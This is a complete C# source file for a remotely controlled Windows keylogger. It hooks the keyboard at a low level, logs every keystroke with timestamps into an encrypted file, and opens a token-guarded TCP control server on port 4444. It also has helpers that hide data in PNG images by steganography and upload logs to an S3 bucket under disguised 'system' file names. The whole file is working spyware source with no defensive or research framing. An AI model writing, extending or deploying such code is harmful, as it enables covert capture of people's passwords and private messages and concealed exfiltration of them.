using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Amazon;
using Amazon.S3;
using Amazon.S3.Model;

namespace SecureKeylogger
{
    // ==================== Configuration ====================
    public static class Config
    {
        public const string LogFile = "system_log.enc";
        public const string KeyFile = "secure.key";
        public const int BufferFlushIntervalSec = 30;

        // Remote control
        public const string RemoteHost = "0.0.0.0";
        public const int RemotePort = 4444;
        public const string AuthToken = "MySecretToken123";  // CHANGE THIS!
    }

    // ==================== Encryption (AES-256-GCM) ====================
    public class SecureEncryption
    {
        private readonly string _password;
        private byte[] _key;
        private byte[] _salt;

        public SecureEncryption(string password) => _password = password;

        private byte[] DeriveKey(string password, byte[] salt)
        {
            using var kdf = new Rfc2898DeriveBytes(password, salt, 100000, HashAlgorithmName.SHA256);
            return kdf.GetBytes(32);
        }

        // FIXED: Key file now protected with Windows DPAPI
        public void GetOrCreateKey(string path = Config.KeyFile)
        {
            if (File.Exists(path))
            {
                // Read and unprotect the key blob
                byte[] protectedBlob = File.ReadAllBytes(path);
                byte[] unprotected = ProtectedData.Unprotect(protectedBlob, null, DataProtectionScope.CurrentUser);

                using var ms = new MemoryStream(unprotected);
                _salt = new byte[16];
                ms.Read(_salt, 0, 16);
                _key = new byte[32];
                ms.Read(_key, 0, 32);

                // If a password was provided, verify it
                if (_password != null)
                {
                    var derived = DeriveKey(_password, _salt);
                    if (!derived.SequenceEqual(_key))
                        throw new UnauthorizedAccessException("Invalid password!");
                }
            }
            else
            {
                if (string.IsNullOrEmpty(_password))
                    throw new InvalidOperationException("No password provided and no existing key file.");

                _salt = RandomNumberGenerator.GetBytes(16);
                _key = DeriveKey(_password, _salt);

                // Combine salt + key into one array
                byte[] combined = new byte[16 + 32];
                Buffer.BlockCopy(_salt, 0, combined, 0, 16);
                Buffer.BlockCopy(_key, 0, combined, 16, 32);

                // Protect with DPAPI
                byte[] protectedBlob = ProtectedData.Protect(combined, null, DataProtectionScope.CurrentUser);
                File.WriteAllBytes(path, protectedBlob);
            }
        }

        public void EncryptFile(string inputPath, string outputPath = null)
        {
            if (_key == null) throw new InvalidOperationException("Encryption not initialized.");
            byte[] plaintext = File.ReadAllBytes(inputPath);
            byte[] iv = RandomNumberGenerator.GetBytes(12);
            using var aes = new AesGcm(_key);
            byte[] ciphertext = new byte[plaintext.Length];
            byte[] tag = new byte[16];
            aes.Encrypt(iv, plaintext, ciphertext, tag);
            outputPath ??= inputPath + ".enc";
            using var fs = new FileStream(outputPath, FileMode.Create);
            fs.Write(iv);
            fs.Write(tag);
            fs.Write(ciphertext);
        }

        public byte[] DecryptFile(string inputPath, string outputPath = null)
        {
            if (_key == null) throw new InvalidOperationException("Encryption not initialized.");
            using var fs = new FileStream(inputPath, FileMode.Open);
            byte[] iv = new byte[12];
            fs.Read(iv, 0, 12);
            byte[] tag = new byte[16];
            fs.Read(tag, 0, 16);
            byte[] ciphertext = new byte[fs.Length - fs.Position];
            fs.Read(ciphertext, 0, ciphertext.Length);
            byte[] plaintext = new byte[ciphertext.Length];
            using var aes = new AesGcm(_key);
            aes.Decrypt(iv, ciphertext, tag, plaintext);
            if (outputPath != null)
                File.WriteAllBytes(outputPath, plaintext);
            return plaintext;
        }
    }

    // ————————————————————— Windows Keyboard Hook ——————————————————————————
    public class KeyboardHook : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;

        private static LowLevelKeyboardProc _proc;
        private IntPtr _hookId = IntPtr.Zero;
        private readonly Dictionary<int, string> _modifierNames = new()
        {
            { 0x10, "shift" }, { 0x11, "ctrl" }, { 0x12, "alt" }, { 0x5B, "cmd" }, { 0x5C, "cmd" }
        };
        private readonly HashSet<int> _activeModifiers = new();

        public event Action<string, bool> KeyEvent; // keyName, isDown

        public KeyboardHook()
        {
            _proc = HookCallback;
            _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle("user32"), 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool isDown = wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN;
                bool isUp = wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP;

                if (_modifierNames.ContainsKey(vkCode))
                {
                    if (isDown) _activeModifiers.Add(vkCode);
                    else if (isUp) _activeModifiers.Remove(vkCode);
                    KeyEvent?.Invoke(_modifierNames[vkCode], isDown);
                }
                else if (isDown)
                {
                    string keyName = GetKeyName(vkCode);
                    if (!string.IsNullOrEmpty(keyName))
                        KeyEvent?.Invoke(keyName, true);
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private string GetKeyName(int vkCode)
        {
            if (vkCode >= 0x30 && vkCode <= 0x39) return ((char)vkCode).ToString();
            if (vkCode >= 0x41 && vkCode <= 0x5A) return ((char)vkCode).ToString();
            return vkCode switch
            {
                0x08 => "backspace", 0x09 => "tab", 0x0D => "enter", 0x1B => "esc",
                0x20 => "space", 0x2E => "delete", 0x24 => "home", 0x23 => "end",
                0x21 => "pgup", 0x22 => "pgdn", 0x25 => "left", 0x26 => "up",
                0x27 => "right", 0x28 => "down", 0x70 => "f1", 0x71 => "f2",
                0x72 => "f3", 0x73 => "f4", 0x74 => "f5", 0x75 => "f6",
                0x76 => "f7", 0x77 => "f8", 0x78 => "f9", 0x79 => "f10",
                0x7A => "f11", 0x7B => "f12", _ => null
            };
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public void Dispose()
        {
            if (_hookId != IntPtr.Zero)
                UnhookWindowsHookEx(_hookId);
        }
    }

    // ==================== Secure Keylogger ====================
    public class SecureKeylogger : IDisposable
    {
        private readonly SecureEncryption _encryption;
        private readonly string _logFile;
        private bool _running = false;
        private readonly List<string> _buffer = new();
        private readonly object _bufferLock = new();
        private readonly HashSet<string> _modifiers = new(); // FIXED: now populated correctly
        private KeyboardHook _hook;
        private Timer _flushTimer;

        public SecureKeylogger(SecureEncryption encryption, string logFile = Config.LogFile)
        {
            _encryption = encryption;
            _logFile = logFile;
        }

        public bool IsRunning => _running;

        public void Start()
        {
            if (_running) return;
            Console.WriteLine("[Keylogger] Starting...");
            _running = true;
            _hook = new KeyboardHook();
            _hook.KeyEvent += OnKeyEvent;
            _flushTimer = new Timer(_ => FlushBuffer(), null, Config.BufferFlushIntervalSec * 1000, Config.BufferFlushIntervalSec * 1000);
        }

        public void Stop()
        {
            if (!_running) return;
            Console.WriteLine("[Keylogger] Stopping...");
            _running = false;
            _flushTimer?.Dispose();
            FlushBuffer();
            _hook?.Dispose();
            Console.WriteLine("[Keylogger] Stopped.");
        }

        // FIXED: Modifier tracking and combo logging
        private void OnKeyEvent(string keyName, bool isDown)
        {
            if (!_running) return;

            if (keyName == "esc" && isDown && _modifiers.Contains("ctrl"))
            {
                Stop();
                return;
            }

            bool isModifier = keyName is "shift" or "ctrl" or "alt" or "cmd";
            if (isModifier)
            {
                if (isDown)
                    _modifiers.Add(keyName);
                else
                    _modifiers.Remove(keyName);
                return; // Don't log modifier presses alone
            }

            if (!isDown) return;

            string output;
            if (keyName.Length == 1 && char.IsLetterOrDigit(keyName[0]))
                output = keyName;
            else
                output = $"[{keyName}]";

            if (_modifiers.Count > 0)
            {
                var orderedMods = _modifiers.OrderBy(m => m switch
                {
                    "ctrl" => 1,
                    "alt"  => 2,
                    "shift"=> 3,
                    "cmd"  => 4,
                    _      => 9
                }).ToArray();
                output = $"<{string.Join("+", orderedMods)}+{output}>";
            }

            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
            string entry = $"[{timestamp}] {output}\n";

            lock (_bufferLock)
            {
                _buffer.Add(entry);
            }
            Debug.Write(entry);
        }

        // FIXED: Robust flush with snapshot, error recovery, and temp file cleanup
        private void FlushBuffer()
        {
            lock (_bufferLock)
            {
                if (_buffer.Count == 0) return;

                List<string> snapshot = new List<string>(_buffer);
                _buffer.Clear();

                try
                {
                    byte[] newContent;
                    if (File.Exists(_logFile))
                    {
                        byte[] existing = _encryption.DecryptFile(_logFile);
                        int totalSize = existing.Length + snapshot.Sum(s => Encoding.UTF8.GetByteCount(s));
                        newContent = new byte[totalSize];
                        Buffer.BlockCopy(existing, 0, newContent, 0, existing.Length);
                        int offset = existing.Length;
                        foreach (var line in snapshot)
                        {
                            byte[] lineBytes = Encoding.UTF8.GetBytes(line);
                            Buffer.BlockCopy(lineBytes, 0, newContent, offset, lineBytes.Length);
                            offset += lineBytes.Length;
                        }
                    }
                    else
                    {
                        newContent = Encoding.UTF8.GetBytes(string.Concat(snapshot));
                    }

                    string tempFile = _logFile + ".tmp";
                    try
                    {
                        File.WriteAllBytes(tempFile, newContent);
                        _encryption.EncryptFile(tempFile, _logFile);
                    }
                    finally
                    {
                        // Always delete the temp plaintext file
                        if (File.Exists(tempFile))
                        {
                            try { File.Delete(tempFile); } catch { /* best effort */ }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Restore snapshot on any error to avoid data loss
                    lock (_bufferLock)
                    {
                        _buffer.InsertRange(0, snapshot);
                    }
                    Debug.WriteLine($"Flush error: {ex.Message}");
                }
            }
        }

        public void Dispose() => Stop();
    }

    // ==================== Remote Controller (TCP Server) ====================
    public class RemoteController
    {
        private readonly SecureKeylogger _keylogger;
        private readonly string _host;
        private readonly int _port;
        private readonly string _authToken;
        private TcpListener _listener;
        private bool _running;
        private Thread _serverThread;

        public RemoteController(SecureKeylogger keylogger, string host = Config.RemoteHost, int port = Config.RemotePort, string authToken = Config.AuthToken)
        {
            _keylogger = keylogger;
            _host = host;
            _port = port;
            _authToken = authToken;
        }

        public void Start()
        {
            _running = true;
            _listener = new TcpListener(IPAddress.Parse(_host), _port);
            _listener.Start();
            Console.WriteLine($"[Remote] Listening on {_host}:{_port}");
            _serverThread = new Thread(RunServer);
            _serverThread.Start();
        }

        public void Stop()
        {
            _running = false;
            _listener?.Stop();
            _serverThread?.Join(2000);
        }

        private void RunServer()
        {
            while (_running)
            {
                try
                {
                    TcpClient client = _listener.AcceptTcpClient();
                    _ = HandleClientAsync(client);
                }
                catch (Exception ex) when (_running)
                {
                    Console.WriteLine($"[Remote] Accept error: {ex.Message}");
                }
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            using (client)
            using (var stream = client.GetStream())
            {
                byte[] buffer = new byte[1024];
                int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (read == 0) return;
                string data = Encoding.UTF8.GetString(buffer, 0, read).Trim();
                var parts = data.Split(' ', 2);
                if (parts.Length != 2)
                {
                    await SendResponse(stream, "ERROR: Invalid format. Use: TOKEN COMMAND\n");
                    return;
                }
                string token = parts[0];
                string command = parts[1].ToUpper();
                if (token != _authToken)
                {
                    await SendResponse(stream, "ERROR: Authentication failed\n");
                    return;
                }

                string response;
                switch (command)
                {
                    case "START":
                        if (!_keylogger.IsRunning)
                        {
                            _keylogger.Start();
                            response = "OK: Keylogger started\n";
                        }
                        else response = "OK: Keylogger already running\n";
                        break;
                    case "STOP":
                        if (_keylogger.IsRunning)
                        {
                            _keylogger.Stop();
                            response = "OK: Keylogger stopped\n";
                        }
                        else response = "OK: Keylogger already stopped\n";
                        break;
                    case "STATUS":
                        response = $"STATUS: {(_keylogger.IsRunning ? "running" : "stopped")}\n";
                        break;
                    case "SHUTDOWN":
                        response = "OK: Shutting down program\n";
                        await SendResponse(stream, response);
                        Environment.Exit(0);
                        return;
                    default:
                        response = $"ERROR: Unknown command '{command}'\n";
                        break;
                }
                await SendResponse(stream, response);
            }
        }

        private static async Task SendResponse(NetworkStream stream, string response)
        {
            byte[] respBytes = Encoding.UTF8.GetBytes(response);
            await stream.WriteAsync(respBytes, 0, respBytes.Length);
        }
    }

    // ==================== Steganography (PNG LSB) – FIXED ====================
    public static class Steganography
    {
        // Seed stored in the first 32 pixels (each pixel provides 3 bits → enough for 32-bit seed)
        private const int SeedPixelCount = 32;

        public static void EmbedData(string imagePath, byte[] data, string outputPath)
        {
            using var img = new Bitmap(imagePath);
            using var outputImg = new Bitmap(img);

            byte[] hash = SHA256.HashData(data);
            int seed = BitConverter.ToInt32(hash, 0);
            var rnd = new Random(seed);

            byte[] payload = BitConverter.GetBytes(data.Length)
                .Concat(data)
                .Concat(hash.Take(16))
                .ToArray();
            int totalBits = payload.Length * 8;

            int width = img.Width, height = img.Height;
            int pixelCount = width * height;
            if (pixelCount < SeedPixelCount)
                throw new ArgumentException("Image too small to embed seed.");

            int availablePixels = pixelCount - SeedPixelCount;
            int maxBits = availablePixels * 3; // R,G,B bits per pixel
            if (totalBits > maxBits)
                throw new ArgumentException("Data too large for this image (after seed reservation).");

            // 1. Embed the seed (32 bits) into the first 32 pixels, one bit per colour channel
            int bitPos = 0;
            for (int i = 0; i < SeedPixelCount && bitPos < 32; i++)
            {
                int x = i % width;
                int y = i / width;
                Color pixel = outputImg.GetPixel(x, y);
                byte r = pixel.R, g = pixel.G, b = pixel.B;

                r = (byte)((r & ~1) | ((seed >> bitPos) & 1));
                bitPos++;
                if (bitPos >= 32) { outputImg.SetPixel(x, y, Color.FromArgb(pixel.A, r, g, b)); break; }

                g = (byte)((g & ~1) | ((seed >> bitPos) & 1));
                bitPos++;
                if (bitPos >= 32) { outputImg.SetPixel(x, y, Color.FromArgb(pixel.A, r, g, b)); break; }

                b = (byte)((b & ~1) | ((seed >> bitPos) & 1));
                bitPos++;

                outputImg.SetPixel(x, y, Color.FromArgb(pixel.A, r, g, b));
            }

            // 2. Embed payload into the remaining pixels in random order
            var pixelIndices = Enumerable.Range(SeedPixelCount, availablePixels).ToArray();
            Shuffle(pixelIndices, rnd);

            int payloadBitIdx = 0;
            foreach (int idx in pixelIndices)
            {
                if (payloadBitIdx >= totalBits) break;

                int x = idx % width;
                int y = idx / width;
                Color pixel = outputImg.GetPixel(x, y);
                byte r = pixel.R, g = pixel.G, b = pixel.B;

                if (payloadBitIdx < totalBits)
                {
                    int bytePos = payloadBitIdx / 8;
                    int bitInByte = payloadBitIdx % 8;
                    int bitVal = (payload[bytePos] >> bitInByte) & 1;
                    r = (byte)((r & ~1) | bitVal);
                    payloadBitIdx++;
                }
                if (payloadBitIdx < totalBits)
                {
                    int bytePos = payloadBitIdx / 8;
                    int bitInByte = payloadBitIdx % 8;
                    int bitVal = (payload[bytePos] >> bitInByte) & 1;
                    g = (byte)((g & ~1) | bitVal);
                    payloadBitIdx++;
                }
                if (payloadBitIdx < totalBits)
                {
                    int bytePos = payloadBitIdx / 8;
                    int bitInByte = payloadBitIdx % 8;
                    int bitVal = (payload[bytePos] >> bitInByte) & 1;
                    b = (byte)((b & ~1) | bitVal);
                    payloadBitIdx++;
                }

                outputImg.SetPixel(x, y, Color.FromArgb(pixel.A, r, g, b));
            }

            outputImg.Save(outputPath, ImageFormat.Png);
        }

        public static byte[] ExtractData(string imagePath)
        {
            using var img = new Bitmap(imagePath);
            int width = img.Width, height = img.Height;
            int pixelCount = width * height;
            if (pixelCount < SeedPixelCount)
                throw new InvalidDataException("Image too small to contain seed.");

            // 1. Extract seed from first SeedPixelCount pixels
            int seed = 0;
            int bitPos = 0;
            for (int i = 0; i < SeedPixelCount && bitPos < 32; i++)
            {
                int x = i % width;
                int y = i / width;
                Color p = img.GetPixel(x, y);
                if (bitPos < 32) { seed |= (p.R & 1) << bitPos; bitPos++; }
                if (bitPos < 32) { seed |= (p.G & 1) << bitPos; bitPos++; }
                if (bitPos < 32) { seed |= (p.B & 1) << bitPos; bitPos++; }
            }

            var rnd = new Random(seed);
            var pixelIndices = Enumerable.Range(SeedPixelCount, pixelCount - SeedPixelCount).ToArray();
            Shuffle(pixelIndices, rnd);

            // 2. Collect bits from those pixels in the shuffled order
            List<int> bits = new();
            foreach (int idx in pixelIndices)
            {
                int x = idx % width;
                int y = idx / width;
                Color p = img.GetPixel(x, y);
                bits.Add(p.R & 1);
                bits.Add(p.G & 1);
                bits.Add(p.B & 1);
            }

            // 3. Convert bits to bytes
            List<byte> bytes = new();
            for (int i = 0; i < bits.Count; i += 8)
            {
                if (i + 8 > bits.Count) break;
                int val = 0;
                for (int j = 0; j < 8; j++)
                    val |= (bits[i + j] << j);
                bytes.Add((byte)val);
            }

            if (bytes.Count < 4)
                throw new InvalidDataException("Insufficient data.");

            int dataLen = BitConverter.ToInt32(bytes.Take(4).ToArray(), 0);
            if (bytes.Count < 4 + dataLen + 16)
                throw new InvalidDataException("Incomplete payload.");

            byte[] extracted = bytes.Skip(4).Take(dataLen).ToArray();
            byte[] storedChecksum = bytes.Skip(4 + dataLen).Take(16).ToArray();
            byte[] computedChecksum = SHA256.HashData(extracted).Take(16).ToArray();

            if (!storedChecksum.SequenceEqual(computedChecksum))
                throw new InvalidDataException("Checksum mismatch – data may be corrupted.");

            return extracted;
        }

        private static void Shuffle<T>(T[] array, Random rng)
        {
            for (int i = array.Length - 1; i > 0; i--)
            {
                int j = rng.Next(i + 1);
                (array[i], array[j]) = (array[j], array[i]);
            }
        }
    }

    // ==================== AWS S3 Uploader ====================
    public class CloudStorageHider
    {
        private readonly IAmazonS3 _s3;
        private readonly string _bucketName;

        public CloudStorageHider(string bucketName, string region = "us-east-1")
        {
            _bucketName = bucketName;
            _s3 = new AmazonS3Client(RegionEndpoint.GetBySystemName(region));
        }

        public async Task<bool> UploadFileAsync(string filePath, string objectKey = null)
        {
            if (objectKey == null)
            {
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                int randomSuffix = new Random().Next(1000, 9999);
                objectKey = $"logs/system_{timestamp}_{randomSuffix}.log";
            }
            try
            {
                var request = new PutObjectRequest
                {
                    BucketName = _bucketName,
                    Key = objectKey,
                    FilePath = filePath,
                    ServerSideEncryptionMethod = ServerSideEncryptionMethod.AES256
                };
                await _s3.PutObjectAsync(request);
                Console.WriteLine($"Uploaded to s3://{_bucketName}/{objectKey}");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Upload failed: {ex.Message}");
                return false;
            }
        }
    }

    // ==================== Main Entry Point ====================
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("     SECURE KEYLOGGER WITH REMOTE CONTROL");
            Console.Write("Enter encryption password: ");
            string password = ReadPassword();
            Console.Write("Confirm password: ");
            string confirm = ReadPassword();
            if (password != confirm)
            {
                Console.WriteLine("Passwords do not match.");
                return;
            }

            var encryption = new SecureEncryption(password);
            try
            {
                encryption.GetOrCreateKey(Config.KeyFile);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Key error: {ex.Message}");
                return;
            }

            var keylogger = new SecureKeylogger(encryption, Config.LogFile);
            var remote = new RemoteController(keylogger);
            remote.Start();

            Console.WriteLine($"\n[Remote Control] Listening on port {Config.RemotePort}");
            Console.WriteLine("Commands: START, STOP, STATUS, SHUTDOWN");
            Console.WriteLine("Use netcat or telnet to send: 'MySecretToken123 COMMAND'");
            Console.WriteLine("\nKeylogger is currently STOPPED. Send START command to begin logging.");
            Console.WriteLine("You can also stop locally with Ctrl+Esc.\n");

            // Keep main thread alive
            try
            {
                while (true) Thread.Sleep(1000);
            }
            catch (ThreadInterruptedException)
            {
                Console.WriteLine("\n[Main] Shutting down...");
                remote.Stop();
                keylogger.Dispose();
            }
        }

        private static string ReadPassword()
        {
            string pass = "";
            ConsoleKeyInfo key;
            do
            {
                key = Console.ReadKey(true);
                if (key.Key != ConsoleKey.Backspace && key.Key != ConsoleKey.Enter)
                {
                    pass += key.KeyChar;
                    Console.Write("*");
                }
                else if (key.Key == ConsoleKey.Backspace && pass.Length > 0)
                {
                    pass = pass[0..^1];
                    Console.Write("\b \b");
                }
            } while (key.Key != ConsoleKey.Enter);
            Console.WriteLine();
            return pass;
        }
    }
}
